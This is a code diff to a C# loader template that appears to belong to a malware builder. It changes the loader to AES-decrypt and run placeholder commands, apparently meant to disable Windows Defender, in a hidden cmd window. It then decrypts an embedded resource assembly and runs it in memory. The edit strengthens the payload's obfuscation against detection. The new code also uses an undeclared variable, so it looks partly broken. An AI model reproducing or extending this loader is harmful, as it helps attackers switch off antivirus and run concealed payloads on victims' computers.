@@ -25,7 +25,7 @@ using System.Windows.Forms;
 
 [assembly: Guid("%Guid%")]
 
-public partial class Loader
+public partial class RLoader
 {
     public static void Main()
     {
@@ -36,12 +36,11 @@ public partial class Loader
             Process.Start(new ProcessStartInfo
             {
                 FileName = "cmd",
-                Arguments = "/c " + Encoding.ASCII.GetString(Convert.FromBase64String("#KillWDCommands").Reverse().ToArray()) + " & exit",
+                Arguments = Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String("#KillWDCommands"))),
                 WindowStyle = ProcessWindowStyle.Hidden,
                 CreateNoWindow = true,
                 UseShellExecute = false,
-                RedirectStandardOutput = true,
-                Verb = "runas",
+                RedirectStandardOutput = true
             });
         }
         catch (Exception ex)
@@ -54,11 +53,7 @@ public partial class Loader
 
         try
         {
-            int startDelay = 0;
-            if (int.TryParse("#STARTDELAY", out startDelay) && startDelay > 0)
-            {
-                Thread.Sleep(startDelay * 1000);
-            }
+            Thread.Sleep(startDelay * 1000);
         }
         catch (Exception ex)
         {
@@ -69,13 +64,26 @@ public partial class Loader
 
         try
         {
-            Assembly.Load(((byte[])new ResourceManager("#LoaderRes", Assembly.GetExecutingAssembly()).GetObject("#Program")).Reverse().ToArray()).CreateInstance("Program").GetType().GetMethod("Main").Invoke(null, new object[0]);
+            Assembly.Load(RAES_Method((byte[])new ResourceManager("#LoaderRes", Assembly.GetExecutingAssembly()).GetObject("#Program"))).EntryPoint.Invoke(null, new object[0]);
         }
         catch (Exception ex)
         {
 #if DefDebug
             MessageBox.Show("L3: " + Environment.NewLine + ex.ToString());
 #endif
+        }
+    }
+
+    public static byte[] RAES_Method(byte[] rarg1)
+    {
+        using (var mStream = new MemoryStream())
+        {
+            using (var cStream = new CryptoStream(mStream, new RijndaelManaged().CreateDecryptor(new Rfc2898DeriveBytes("#KEY", Encoding.ASCII.GetBytes("#SALT"), 100).GetBytes(16), Encoding.ASCII.GetBytes("#IV")), CryptoStreamMode.Write))
+            {
+                cStream.Write(rarg1, 0, rarg1.Length);
+                cStream.Close();
+            }
+            return mStream.ToArray();
         }
     }
 }
